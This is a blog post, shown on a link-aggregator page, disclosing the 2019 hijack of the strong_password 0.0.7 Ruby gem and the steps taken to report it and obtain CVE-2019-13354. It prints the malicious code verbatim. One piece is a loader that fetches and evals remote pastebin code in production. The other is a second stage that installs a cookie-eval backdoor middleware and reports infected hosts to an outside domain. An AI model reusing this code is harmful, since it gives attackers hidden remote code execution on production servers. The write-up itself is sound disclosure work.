<!DOCTYPE html>
<html lang="en">
<head>
    <title>
strong_password v0.0.7 rubygem hijacked -
linksfor.dev(s)
    </title>
    <meta charset="utf-8">
    <meta name="Description" content="A curated source of links that devs might find interesting. Updated around the clock." />
    <meta name="google" value="notranslate">
    <style type="text/css">
        html {
            font-family: sans-serif;
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: transparent;
            height: 100%;
        }

        *, ::after, ::before {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            color: #60656a;
            text-align: left;
            background-color: #323b44;
        }

        h1 {
            font-size: 6rem;
            font-weight: 300;
            line-height: 1.2;
            margin-top: 0;
            margin-bottom: 0.5rem;
            margin-bottom: 0.5rem
        }

        a {
            color: #007bff;
            color: #ccc;
            text-decoration: none;
            background-color: transparent;
            word-break: break-all;
        }

        .unseen a {
            font-weight: bold;
        }

        h3 {
            margin-top: 0;
            padding-top: 0;
            font-weight: normal;
        }

        .grid {
            -ms-flex-direction: column;
            flex-direction: column;
            width: 1024px;
            margin: 0 auto;
            flex: 1 0 auto;
        }

        .row {
            -ms-flex-direction: row;
            flex-direction: row;
            width: 100%;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            display: -ms-flexbox;
            display: flex;
        }

        .col {
            margin: 0 10px 0 10px;
            box-sizing: border-box;
            vertical-align: top;
        }

        .col-3-of-4, .col-6-of-8, .col-9-of-12 {
            width: calc(75% - 20px);
        }

        .col-1-of-4, .col-2-of-8, .col-3-of-12 {
            width: calc(25% - 20px);
        }

        @media (max-width:1023px) {
            /* big landscape tablets, laptops, and desktops */
            body {
                overflow-x: hidden;
            }

            main {
                width: 99%;
            }

            h1 {
                font-size: 50px;
            }
        }

        .text-right {
            text-align: right;
        }

        footer {
            left: 0;
            width: 100%;
            margin-top: 2em;
            padding: 50px 0;
            text-align: center;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        .readable {
            color: #949ba2;
        }

        svg:not(:root).svg-inline--fa {
            color: #60656a;
            overflow: visible;
        }

        .svg-inline--fa.fa-w-12 {
            width: 0.75em;
        }

        svg:not(:root) {
            overflow: hidden;
        }

        .svg-inline--fa {
            display: inline-block;
            font-size: inherit;
            height: 1em;
            overflow: visible;
            vertical-align: -0.125em;
        }

        img {
            max-width: 100%;
        }

        .text-center {
            text-align: center;
        }

        .readable h1 {
            font-size: 2em;
        }
    </style>
</head>
<body>
    <div class="grid">
        
<div class="readable">
    <h1>strong_password v0.0.7 rubygem hijacked</h1>
    <div class="article"> <p class="author"> Tute Costa <span class="date">July 3, 2019</span> </p> <p>I recently updated minor and patch versions of the gems our Rails app uses. We
want to keep dependencies fresh, bugs fixed, security vulnerabilities addressed
while maintaining a high chance of backward compatibility with our codebase. In
all, it was 25 gems we&#x2019;d upgrade.</p> <p>I went line by line linking to each library&#x2019;s changeset. <strong>This due diligence
never reported significant surprises to me, until this time</strong>. Most
gems have a <code>CHANGELOG.md</code> file that describes the changes in each version. Some
do not, and I had to compare by git tags or commits list (like cocoon or bcrypt
gems). The <code>jquery-rails</code> upgrade contains a <code>jQuery.js</code> upgrade, so the related
log was in another project.</p> <p><strong>And I couldn&#x2019;t find the changes for <code>strong_password</code></strong>. It appeared to have
gone from 0.0.6 to 0.0.7, yet the last change in any branch in GitHub was from 6
months ago, and we were up to date with those. If there was new code, it existed
only in <code>RubyGems.org</code>.</p> <p>I downloaded the gem from RubyGems and compared its contents with the latest
copy in GitHub. At the end of <code>lib/strong_password/strength_checker.rb</code> version
0.0.7 there was the following:</p>
<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">_!</span><span class="p">;</span><span class="k">begin</span><span class="p">;</span><span class="k">yield</span><span class="p">;</span><span class="k">rescue</span> <span class="no">Exception</span><span class="p">;</span><span class="k">end</span><span class="p">;</span><span class="k">end</span>
<span class="n">_!</span><span class="p">{</span><span class="no">Thread</span><span class="p">.</span><span class="nf">new</span><span class="p">{</span><span class="kp">loop</span><span class="p">{</span><span class="n">_!</span><span class="p">{</span><span class="nb">sleep</span>
<span class="nb">rand</span><span class="o">*</span><span class="mi">3333</span><span class="p">;</span><span class="nb">eval</span><span class="p">(</span><span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="no">URI</span><span class="p">(</span><span class="s1">&apos;https://pastebin.com/raw/xa456PFt&apos;</span><span class="p">)))}}}</span><span class="k">if</span>
<span class="no">Rails</span><span class="p">.</span><span class="nf">env</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;p&quot;</span><span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>I checked who published it and it was an almost empty account, with a different
name than the maintainer&#x2019;s, with access only to this gem. I checked the
maintainer&#x2019;s email in GitHub and wrote to him with the prettified version of the
diff:</p>
<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">_!</span><span class="p">;</span> <span class="k">begin</span><span class="p">;</span> <span class="k">yield</span><span class="p">;</span> <span class="k">rescue</span> <span class="no">Exception</span><span class="p">;</span> <span class="k">end</span><span class="p">;</span>
<span class="k">end</span> <span class="n">_!</span><span class="p">{</span> <span class="no">Thread</span><span class="p">.</span><span class="nf">new</span> <span class="p">{</span> <span class="kp">loop</span> <span class="p">{</span> <span class="n">_!</span><span class="p">{</span> <span class="nb">sleep</span> <span class="nb">rand</span> <span class="o">*</span> <span class="mi">3333</span><span class="p">;</span> <span class="nb">eval</span><span class="p">(</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span> <span class="no">URI</span><span class="p">(</span><span class="s1">&apos;https://pastebin.com/raw/xa456PFt&apos;</span><span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span> <span class="k">if</span> <span class="no">Rails</span><span class="p">.</span><span class="nf">env</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;p&quot;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>In a loop within a new thread, after waiting for a random number of seconds up
to about an hour, it fetches and runs the code stored in a <code>pastebin.com</code>, only if
running in production, with an empty exception handling that ignores any error
it may raise.</p> <p>In fifteen minutes, Brian McManus wrote back:</p> <blockquote>
<p>The gem seems to have been pulled out from under me&#x2026; When I login to
rubygems.org I don&#x2019;t seem to have ownership now. Bogus 0.0.7 release was
created 6/25/2019.</p>
</blockquote> <p>In case the Pastebin got deleted or changed, I emailed the Pastebin that was up
on June 28th at 8 PM UTC, carbon-copying Ruby on Rails&#x2019; security coordinator,
<a href="https://twitter.com/rafaelfranca">Rafael Fran&#xE7;a</a>:</p>
<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">_!</span> <span class="p">{</span>
<span class="k">unless</span> <span class="n">defined?</span><span class="p">(</span><span class="no">Z1</span><span class="p">)</span> <span class="no">Rack</span><span class="o">::</span><span class="no">Sendfile</span><span class="p">.</span><span class="nf">prepend</span> <span class="no">Module</span><span class="p">.</span><span class="nf">new</span><span class="p">{</span><span class="n">define_method</span><span class="p">(</span><span class="ss">:call</span><span class="p">){</span><span class="o">|</span><span class="n">e</span><span class="o">|</span> <span class="n">_!</span><span class="p">{</span><span class="nb">eval</span><span class="p">(</span><span class="no">Base64</span><span class="p">.</span><span class="nf">urlsafe_decode64</span><span class="p">(</span><span class="n">e</span><span class="p">[</span><span class="s1">&apos;HTTP_COOKIE&apos;</span><span class="p">].</span><span class="nf">match</span><span class="p">(</span><span class="sr">/___id=(.+);/</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))}</span> <span class="k">super</span><span class="p">(</span><span class="n">e</span><span class="p">)}}</span> <span class="no">Z1</span> <span class="o">=</span> <span class="s2">&quot;(:&quot;</span>
<span class="k">end</span>
<span class="p">}</span> <span class="n">_!</span> <span class="p">{</span> <span class="no">Faraday</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="s2">&quot;http://smiley.zzz.com.ua&quot;</span><span class="p">,</span> <span class="p">{</span> <span class="s2">&quot;x&quot;</span> <span class="o">=&gt;</span> <span class="no">ENV</span><span class="p">[</span><span class="s2">&quot;URL_HOST&quot;</span><span class="p">].</span><span class="nf">to_s</span> <span class="p">})</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>While waiting for their answers, I tried to understand the code. If it didn&#x2019;t
run before (checking for the existence of the <code>Z1</code> dummy constant) it injects a
middleware that <code>eval</code>&#x2018;s cookies named with an <code>___id</code> suffix, only in
production, all surrounded by the empty exception handler <code>_!</code> function that&#x2019;s
defined in the hijacked gem, opening the door to <strong>silently executing remote
code in production at the attacker&#x2019;s will</strong>.</p> <p>It also sends a request to a controlled domain with an HTTP header informing the
infected host URLs. It depends on the Faraday gem being loaded for the
notification to work (which the <code>oauth2</code> and <code>stripe</code> gems, for example,
include).</p> <p>Rafael Fran&#xE7;a replied in 25 minutes, adding <code>security@rubygems.org</code> to the thread.
Someone at RubyGems quickly yanked it, and the next day Andr&#xE9; Arko confirmed he
had yanked it, locked the <code>kickball</code> RubyGems account, and added Brian back to
the gem.</p> <p>I asked for a CVE identifier (Common Vulnerabilities and Exposures) to
<code>cve-request@mitre.org</code>, and they assigned CVE-2019-13354, which I used to announce
the potential issue in production installations to the <a href="https://github.com/rubysec/ruby-advisory-db">rubysec/ruby-advisory-db</a>
project and the <a href="https://groups.google.com/forum/#!forum/ruby-security-ann">ruby-security-ann Google Group</a>.</p> </div>
</div>
    </div>
    <footer>
        <div>created by buildstarted &copy; 2019 <a href="/about">about</a></div>
        <div>Share this page on social media: copy and paste this url https://linksfor.dev/</div>
    </footer>
    
</body>
</html>